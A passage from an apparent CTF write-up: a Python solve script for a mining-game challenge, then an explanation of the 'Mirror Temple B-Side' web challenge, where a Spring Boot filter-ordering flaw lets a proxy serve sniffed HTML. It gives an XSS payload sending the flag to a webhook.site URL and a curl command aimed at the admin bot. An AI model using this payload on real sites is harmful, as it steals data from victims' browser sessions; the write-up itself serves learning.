px, py = st["x"], st["y"]

def try_upgrades():
    global bal, tier, rng
    for t, cost, name, r in [(1,100,"Stone",15),(2,500,"Iron",40),(3,5000,"Gold",100)]:
        if tier < t and bal >= cost:
            must("POST", "/buy", {"item": str(t)})
            bal -= cost; tier = t; rng = r

shaft_bottom = py

while nrg > 0 and bal < 1_000_000:
    try_upgrades()
    if bal >= 1_000_000: break

    # Dig down to open new levels
    d, err = api("POST", "/dig", {"direction": "down"})
    if err: break
    nrg -= 1; blocks = d["blocks"]; bal = d["balance"]
    new_bottom = shaft_bottom - blocks

    # Move to bottom
    moves = [{"x": px, "y": shaft_bottom - i} for i in range(1, blocks + 1)]
    for i in range(0, len(moves), 32):
        must("POST", "/move", {"moves": moves[i:i+32]})

    old_bottom, shaft_bottom, py = shaft_bottom, new_bottom, new_bottom

    # Exploit right at each new y level
    cur_y = py
    for ey in range(new_bottom, old_bottom):
        if nrg <= 0 or bal >= 1_000_000: break
        if cur_y < ey:
            mv = [{"x": px, "y": cur_y + s + 1} for s in range(ey - cur_y)]
            for i in range(0, len(mv), 32):
                must("POST", "/move", {"moves": mv[i:i+32]})
            cur_y = ey

        d, err = api("POST", "/dig", {"direction": "right"})
        if err: continue  # higher-tier ore blocks
        nrg -= 1; bal = d["balance"]
        try_upgrades()

    # Return to shaft bottom
    if cur_y > shaft_bottom:
        mv = [{"x": px, "y": cur_y - s - 1} for s in range(cur_y - shaft_bottom)]
        for i in range(0, len(mv), 32):
            must("POST", "/move", {"moves": mv[i:i+32]})
        py = shaft_bottom

# Buy flag
if bal >= 1_000_000:
    d = must("POST", "/buy", {"item": "flag"})
    print(f"FLAG: {d['flag']}")
```

#### Result

```
  [right] y=-64, blk=1, earn=30000, cost=285, net=29715, bal=1015344, nrg=171

  🏴 FLAG: dice{first_we_mine_then_we_cr4ft}
```

Reached **1,015,344 DC** using only **79 of 250 energy** — 171 energy to spare.

---
### Mirror Temple B-Side

#### Challenge Overview

**Mirror Temple B-Side** is a web challenge with a Spring Boot Kotlin backend, a Thymeleaf-rendered frontend, and an automated headless Chrome "admin bot". The backend serves a few simple endpoints, including a proxy feature powered by `mkopylec/charon`.

The server enforces an incredibly strict Content-Security-Policy (CSP) that explicitly maps out allowed script hashes:

```http
Content-Security-Policy: default-src 'none'; script-src 'sha384-eX8v58W...' 'sha384-dBN...' 'sha384-ZRK...'; ...
```

Alongside standard `X-Content-Type-Options: nosniff` and `HttpOnly` JWT cookies, standard XSS exfiltration seems entirely impossible.

#### The Vulnerability

The core vulnerability doesn't lie in the `/postcard-from-nyc` template or a DOM Clashing vulnerability, but rather in **Spring Boot Filter Chain Ordering**.

The proxy endpoint is established using the `CharonFilter`. By default, this filter registers with a very low order, putting it ahead of most Spring application filters:

1. `CharonFilter` (The Proxy)
2. `SecurityTMFilter` (Applies strict CSP and permissive CORS)
3. `JwtAuthFilter` (Handles Authentication)

Because `CharonFilter` consumes requests mapped to `/proxy` and returns the proxied HTTP response immediately, it **never invokes `filterChain.doFilter(request, response)`**.

As a result, responses returned by `/proxy`:

1. **Lack Authentication:** allowing anyone to use the proxy without a JWT.
2. **Lack the strict CSP:** bypassing the restrictive hashes.
3. **Lack `X-Content-Type-Options: nosniff`:** omitting standard Spring Security protections.

#### The Exploit

While Pastebin (and similar services) serve files as `text/plain` which usually prevents XSS, the absence of the `nosniff` header allows us to abuse Chrome's **Content Sniffing Strategy** (MIME sniffing). When Chrome receives a `text/plain` response lacking `nosniff` and detects HTML tags (`<html><head>`) within the first 512 bytes, it upgrades the render mode to `text/html`.

Since the proxy operates on `localhost:8080`, this gives us unmitigated XSS within the origin.

##### Attack Steps

1. **Host the HTML Payload:** We spin up a local server (exposed via an SSH tunnel like `localhost.run`) or use an internet pastebin service that returns plain text without `charset=utf-8` to bypass strict matching.

```html
<html>
  <head></head>
  <body>
    <script>
      fetch("http://localhost:8080/flag")
        .then((r) => r.text())
        .then((flag) => {
          fetch(
            "https://webhook.site/09763622-a7e9-4088-af50-d166c9228326/?flag=" +
              encodeURIComponent(flag),
          );
        });
    </script>
  </body>
</html>
```

2. **Trigger the Bot:** We send the bot an authenticated POST request to `/report` with the proxy URL as the `targetUrl`:

```bash
   curl -v -b cookies.txt -d "url=http://localhost:8080/proxy?url=https://YOUR_TUNNEL_URL/" 'https://mirror-temple-b-side-ad46369f4388.ctfi.ng/report'
```

3. **Capture the Flag:**
   The admin evaluates the proxy, executing the `fetch()` with its `HttpOnly` JWT cookie intact.

#### The Flag

`dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_42_rof_ekawa_neeb_evah_i_tcaf_nuf}`

---
